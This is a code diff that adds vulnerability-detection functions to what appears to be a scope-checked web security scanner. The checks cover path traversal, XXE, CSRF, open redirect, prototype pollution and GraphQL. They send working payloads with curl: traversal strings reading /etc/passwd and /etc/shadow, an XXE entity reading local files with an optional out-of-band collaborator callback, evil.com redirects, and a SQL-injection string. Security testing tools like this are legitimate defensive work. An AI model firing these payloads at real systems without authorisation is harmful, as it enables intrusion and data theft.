@@ -25,6 +25,7 @@ from kambo.validation import (
     validate_cors,
     validate_csrf,
     validate_deserialization,
+    validate_graphql,
     validate_idor,
     validate_jwt,
     validate_open_redirect,
@@ -618,4 +619,454 @@ async def vuln_subdomain_takeover(target: str) -> dict:
         "vulnerable": chain.total_weight >= 1.0,
         "confidence": chain.confidence.value,
         "evidence": chain.summary(),
+    }
+
+
+async def vuln_path_traversal(
+    target: str,
+    parameter: str = "file",
+) -> dict:
+    """Path traversal / Local File Inclusion detection with file content validation.
+
+    Tests common traversal payloads and validates by matching known file content
+    signatures (e.g., /etc/passwd, win.ini) — not just status codes.
+
+    Args:
+        target: URL with potential path traversal parameter
+        parameter: Parameter name to inject traversal payloads into
+    """
+    validate_scope(target)
+    runner = get_runner()
+    metrics = get_metrics()
+
+    url = target if target.startswith("http") else f"https://{target}"
+
+    payloads = [
+        ("../../../../etc/passwd", "linux_passwd"),
+        ("../../../../etc/shadow", "linux_shadow"),
+        ("../../../../windows/win.ini", "windows_ini"),
+        ("....//....//....//etc/passwd", "double_dot_bypass"),
+        ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "url_encoded"),
+    ]
+
+    baseline_cmd = f'curl -s "{url}?{parameter}=index.html" 2>/dev/null'
+    baseline_result = await runner.run(baseline_cmd, "vuln_path_traversal_baseline", target, Phase.VULN_ANALYSIS, timeout=15)
+    baseline_body = baseline_result.raw_output
+
+    best_chain = EvidenceChain()
+    results_list = []
+
+    for payload, label in payloads:
+        cmd = f'curl -s "{url}?{parameter}={payload}" 2>/dev/null'
+        result = await runner.run(cmd, "vuln_path_traversal", target, Phase.VULN_ANALYSIS, timeout=15)
+        chain = validate_path_traversal(result.raw_output, payload, baseline_body)
+
+        results_list.append({
+            "payload": payload,
+            "label": label,
+            "confidence": chain.confidence.value,
+            "evidence": chain.summary(),
+        })
+
+        if chain_rank(chain) > chain_rank(best_chain):
+            best_chain = chain
+
+        if confidence_meets(best_chain.confidence, Confidence.FIRM):
+            break
+
+    metrics.record_run("vuln_path_traversal")
+    if best_chain.total_weight > 0:
+        metrics.record_finding("vuln_path_traversal", best_chain.confidence, best_chain.total_weight)
+
+    return {
+        "target": target,
+        "parameter": parameter,
+        "vulnerable": confidence_meets(best_chain.confidence, Confidence.FIRM),
+        "confidence": best_chain.confidence.value,
+        "evidence": best_chain.summary(),
+        "results": results_list,
+    }
+
+
+async def vuln_xxe(
+    target: str,
+    parameter: str = "",
+    callback_url: str = "",
+) -> dict:
+    """XML External Entity (XXE) Injection detection.
+
+    Tests in-band file read payloads and optionally OOB via a collaborator URL.
+    Validates response body for known file content signatures (doctrine I1/I3).
+
+    Args:
+        target: URL that accepts XML input
+        parameter: POST body parameter name containing XML (empty = raw XML body)
+        callback_url: OOB collaborator URL for blind XXE detection
+    """
+    validate_scope(target)
+    runner = get_runner()
+    metrics = get_metrics()
+
+    url = target if target.startswith("http") else f"https://{target}"
+
+    inband_payload = (
+        "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"
+        "<root>&xxe;</root>"
+    )
+    baseline_cmd = (
+        f'curl -s -X POST -H "Content-Type: application/xml" '
+        f'-d "<root>test</root>" "{url}" 2>/dev/null'
+    )
+    baseline_result = await runner.run(baseline_cmd, "vuln_xxe_baseline", target, Phase.VULN_ANALYSIS, timeout=15)
+    baseline_body = baseline_result.raw_output
+
+    cmd = (
+        f'curl -s -X POST -H "Content-Type: application/xml" '
+        f"-d '{inband_payload}' \"{url}\" 2>/dev/null"
+    )
+    result = await runner.run(cmd, "vuln_xxe", target, Phase.VULN_ANALYSIS, timeout=30)
+    chain = validate_xxe(
+        output=result.raw_output,
+        payload=inband_payload,
+        expected_content="root:x:0:0",
+        baseline_body=baseline_body,
+    )
+
+    if callback_url:
+        oob_payload = (
+            f"<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'http://{callback_url}/xxe'>]>"
+            "<root>&xxe;</root>"
+        )
+        oob_cmd = (
+            f'curl -s -X POST -H "Content-Type: application/xml" '
+            f"-d '{oob_payload}' \"{url}\" 2>/dev/null"
+        )
+        await runner.run(oob_cmd, "vuln_xxe_oob", target, Phase.VULN_ANALYSIS, timeout=15)
+        chain = chain.add_fp_check(
+            f"OOB probe sent to {callback_url} — poll the collaborator; "
+            "a received hit confirms XXE (I3). Pass oob_hit=True to lift cap."
+        )
+
+    metrics.record_run("vuln_xxe")
+    if chain.total_weight > 0:
+        metrics.record_finding("vuln_xxe", chain.confidence, chain.total_weight)
+
+    return {
+        "target": target,
+        "vulnerable": confidence_meets(chain.confidence, Confidence.FIRM),
+        "confidence": chain.confidence.value,
+        "evidence": chain.summary(),
+        "raw": result.raw_output[:2000],
+    }
+
+
+async def vuln_csrf(
+    target: str,
+    endpoint: str = "",
+    method: str = "POST",
+    token: str = "",
+) -> dict:
+    """CSRF vulnerability assessment — checks for CSRF tokens, SameSite cookies, CORS.
+
+    Fetches the page/form and inspects response headers for CSRF mitigations.
+    Does NOT submit forms (passive analysis only unless state_change_confirmed manually).
+
+    Args:
+        target: Base URL of the target application
+        endpoint: Specific endpoint/form to check (appended to target if given)
+        method: HTTP method the form uses (GET/POST)
+        token: Auth token to include in requests
+    """
+    validate_scope(target)
+    runner = get_runner()
+    metrics = get_metrics()
+
+    url = target if target.startswith("http") else f"https://{target}"
+    if endpoint:
+        url = url.rstrip("/") + "/" + endpoint.lstrip("/")
+
+    auth_header = f'-H "Authorization: Bearer {token}"' if token else ""
+    cmd = f'curl -s -D - {auth_header} "{url}" 2>/dev/null'
+    result = await runner.run(cmd, "vuln_csrf", target, Phase.VULN_ANALYSIS, timeout=15)
+
+    output = result.raw_output
+    import re
+
+    # Parse headers/body
+    parts = output.split("\r\n\r\n", 1)
+    headers = parts[0] if len(parts) > 1 else output
+    body = parts[1] if len(parts) > 1 else ""
+
+    # Detect CSRF token in body or form
+    has_csrf_token = bool(re.search(
+        r'(csrf[_-]?token|_token|authenticity_token|csrfmiddlewaretoken)',
+        body, re.IGNORECASE,
+    ))
+
+    # Parse SameSite from Set-Cookie
+    samesite_match = re.search(r"SameSite=(\w+)", headers, re.IGNORECASE)
+    samesite = samesite_match.group(1) if samesite_match else ""
+
+    # Parse Content-Type
+    ct_match = re.search(r"Content-Type:\s*([^\r\n]+)", headers, re.IGNORECASE)
+    content_type = ct_match.group(1).strip() if ct_match else ""
+
+    # Parse CORS
+    cors_match = re.search(r"Access-Control-Allow-Origin:\s*([^\r\n]+)", headers, re.IGNORECASE)
+    cors_origin = cors_match.group(1).strip() if cors_match else ""
+
+    chain = validate_csrf(
+        output=output,
+        has_csrf_token=has_csrf_token,
+        samesite_cookie=samesite,
+        content_type=content_type,
+        method=method,
+        cors_origin=cors_origin,
+    )
+
+    metrics.record_run("vuln_csrf")
+    if chain.total_weight > 0:
+        metrics.record_finding("vuln_csrf", chain.confidence, chain.total_weight)
+
+    return {
+        "target": target,
+        "endpoint": endpoint or "/",
+        "has_csrf_token": has_csrf_token,
+        "samesite_cookie": samesite,
+        "cors_origin": cors_origin,
+        "vulnerable": confidence_meets(chain.confidence, Confidence.FIRM),
+        "confidence": chain.confidence.value,
+        "evidence": chain.summary(),
+    }
+
+
+async def vuln_open_redirect(
+    target: str,
+    parameter: str = "url",
+) -> dict:
+    """Open Redirect detection — injects external URLs and follows redirects.
+
+    Sends redirect payloads and checks whether the server issues a 3xx
+    pointing to the injected domain. Uses curl -L to follow the chain.
+
+    Args:
+        target: URL with a redirect parameter
+        parameter: Query/body parameter that controls the redirect destination
+    """
+    validate_scope(target)
+    runner = get_runner()
+    metrics = get_metrics()
+
+    url = target if target.startswith("http") else f"https://{target}"
+    sep = "&" if "?" in url else "?"
+
+    redirect_targets = [
+        "https://evil.com/",
+        "//evil.com",
+        "/\\evil.com",
+    ]
+
+    # Baseline: what does the redirect param look like without injection?
+    baseline_cmd = f'curl -s -D - "{url}{sep}{parameter}=https://example.com" 2>/dev/null'
+    baseline_result = await runner.run(baseline_cmd, "vuln_open_redirect_baseline", target, Phase.VULN_ANALYSIS, timeout=15)
+    import re
+    loc_match = re.search(r"Location:\s*([^\r\n]+)", baseline_result.raw_output, re.IGNORECASE)
+    baseline_redirect = loc_match.group(1).strip() if loc_match else ""
+
+    best_chain = EvidenceChain()
+    results_list = []
+
+    for redirect_url in redirect_targets:
+        cmd = f'curl -s -D - -m 10 "{url}{sep}{parameter}={redirect_url}" 2>/dev/null'
+        result = await runner.run(cmd, "vuln_open_redirect", target, Phase.VULN_ANALYSIS, timeout=15)
+
+        status_match = re.search(r"HTTP/\d\.?\d?\s+(\d{3})", result.raw_output)
+        status_code = int(status_match.group(1)) if status_match else 0
+        loc2_match = re.search(r"Location:\s*([^\r\n]+)", result.raw_output, re.IGNORECASE)
+        final_url = loc2_match.group(1).strip() if loc2_match else ""
+
+        chain = validate_open_redirect(
+            output=result.raw_output,
+            redirect_url=redirect_url,
+            final_url=final_url,
+            status_code=status_code,
+            baseline_redirect=baseline_redirect,
+        )
+
+        results_list.append({
+            "payload": redirect_url,
+            "status_code": status_code,
+            "final_url": final_url,
+            "confidence": chain.confidence.value,
+            "evidence": chain.summary(),
+        })
+
+        if chain_rank(chain) > chain_rank(best_chain):
+            best_chain = chain
+
+        if confidence_meets(best_chain.confidence, Confidence.FIRM):
+            break
+
+    metrics.record_run("vuln_open_redirect")
+    if best_chain.total_weight > 0:
+        metrics.record_finding("vuln_open_redirect", best_chain.confidence, best_chain.total_weight)
+
+    return {
+        "target": target,
+        "parameter": parameter,
+        "vulnerable": confidence_meets(best_chain.confidence, Confidence.FIRM),
+        "confidence": best_chain.confidence.value,
+        "evidence": best_chain.summary(),
+        "results": results_list,
+    }
+
+
+async def vuln_prototype_pollution(
+    target: str,
+    endpoint: str = "",
+    token: str = "",
+) -> dict:
+    """Prototype Pollution detection via JSON body injection.
+
+    Injects __proto__ and constructor.prototype keys into POST JSON bodies
+    and checks whether the injected value propagates into the response.
+
+    Args:
+        target: Base URL of the target application
+        endpoint: API endpoint to inject into (appended to target)
+        token: Auth token for authenticated endpoints
+    """
+    validate_scope(target)
+    runner = get_runner()
+    metrics = get_metrics()
+
+    url = target if target.startswith("http") else f"https://{target}"
+    if endpoint:
+        url = url.rstrip("/") + "/" + endpoint.lstrip("/")
+
+    auth_header = f'-H "Authorization: Bearer {token}"' if token else ""
+    injected_value = "kambo_pp_canary_31337"
+
+    # Baseline: normal POST
+    baseline_cmd = (
+        f'curl -s -X POST -H "Content-Type: application/json" {auth_header} '
+        f'-d \'{{"name": "test"}}\' "{url}" 2>/dev/null'
+    )
+    baseline_result = await runner.run(baseline_cmd, "vuln_pp_baseline", target, Phase.VULN_ANALYSIS, timeout=15)
+    baseline_body = baseline_result.raw_output
+
+    payloads = [
+        f'{{"__proto__": {{"polluted": "{injected_value}"}}}}',
+        f'{{"constructor": {{"prototype": {{"polluted": "{injected_value}"}}}}}}',
+    ]
+
+    best_chain = EvidenceChain()
+
+    for payload in payloads:
+        cmd = (
+            f'curl -s -X POST -H "Content-Type: application/json" {auth_header} '
+            f"-d '{payload}' \"{url}\" 2>/dev/null"
+        )
+        result = await runner.run(cmd, "vuln_prototype_pollution", target, Phase.VULN_ANALYSIS, timeout=15)
+        chain = validate_prototype_pollution(
+            output=result.raw_output,
+            payload=payload,
+            injected_value=injected_value,
+            baseline_body=baseline_body,
+        )
+
+        if chain_rank(chain) > chain_rank(best_chain):
+            best_chain = chain
+
+        if confidence_meets(best_chain.confidence, Confidence.FIRM):
+            break
+
+    metrics.record_run("vuln_prototype_pollution")
+    if best_chain.total_weight > 0:
+        metrics.record_finding("vuln_prototype_pollution", best_chain.confidence, best_chain.total_weight)
+
+    return {
+        "target": target,
+        "endpoint": endpoint or "/",
+        "vulnerable": confidence_meets(best_chain.confidence, Confidence.FIRM),
+        "confidence": best_chain.confidence.value,
+        "evidence": best_chain.summary(),
+    }
+
+
+async def vuln_graphql(
+    target: str,
+    endpoint: str = "/graphql",
+) -> dict:
+    """GraphQL security assessment — introspection, error verbosity, injection.
+
+    Three attack vectors:
+    1. Introspection enabled (full schema leak)
+    2. Verbose errors (field names and types leak from malformed queries)
+    3. Injection via field arguments (SQL/NoSQL errors from injected chars)
+
+    Args:
+        target: Base URL of the application
+        endpoint: GraphQL endpoint path (default: /graphql)
+    """
+    validate_scope(target)
+    runner = get_runner()
+    metrics = get_metrics()
+
+    base = target if target.startswith("http") else f"https://{target}"
+    url = base.rstrip("/") + "/" + endpoint.lstrip("/")
+
+    # 1. Baseline
+    baseline_cmd = (
+        f'curl -s -X POST -H "Content-Type: application/json" '
+        f'-d \'{{"query": "{{ __typename }}"}}\' "{url}" 2>/dev/null'
+    )
+    baseline_result = await runner.run(baseline_cmd, "vuln_graphql_baseline", target, Phase.VULN_ANALYSIS, timeout=15)
+    baseline_body = baseline_result.raw_output
+
+    # 2. Introspection query
+    introspection_query = (
+        '{"query": "{ __schema { queryType { name } types { name kind } directives { name } } }"}'
+    )
+    intro_cmd = (
+        f'curl -s -X POST -H "Content-Type: application/json" '
+        f"-d '{introspection_query}' \"{url}\" 2>/dev/null"
+    )
+    intro_result = await runner.run(intro_cmd, "vuln_graphql_introspection", target, Phase.VULN_ANALYSIS, timeout=20)
+
+    # 3. Error verbosity (malformed query)
+    error_cmd = (
+        f'curl -s -X POST -H "Content-Type: application/json" '
+        f'-d \'{{"query": "{{ nonExistentField123 }}"}}\' "{url}" 2>/dev/null'
+    )
+    error_result = await runner.run(error_cmd, "vuln_graphql_error", target, Phase.VULN_ANALYSIS, timeout=15)
+
+    # 4. Injection probe (single-quote to trigger SQL/parser errors)
+    injection_payload = '{"query": "{ user(id: \\"1\' OR 1=1 --\\") { id name } }"}'
+    injection_cmd = (
+        f"curl -s -X POST -H 'Content-Type: application/json' "
+        f"-d {injection_payload!r} \"{url}\" 2>/dev/null"
+    )
+    injection_result = await runner.run(injection_cmd, "vuln_graphql_injection", target, Phase.VULN_ANALYSIS, timeout=15)
+
+    chain = validate_graphql(
+        output=baseline_body,
+        introspection_response=intro_result.raw_output,
+        error_response=error_result.raw_output,
+        injection_response=injection_result.raw_output,
+        baseline_body=baseline_body,
+    )
+
+    metrics.record_run("vuln_graphql")
+    if chain.total_weight > 0:
+        metrics.record_finding("vuln_graphql", chain.confidence, chain.total_weight)
+
+    return {
+        "target": target,
+        "endpoint": endpoint,
+        "vulnerable": confidence_meets(chain.confidence, Confidence.FIRM),
+        "confidence": chain.confidence.value,
+        "evidence": chain.summary(),
+        "introspection_raw": intro_result.raw_output[:2000],
+        "error_raw": error_result.raw_output[:1000],
     }
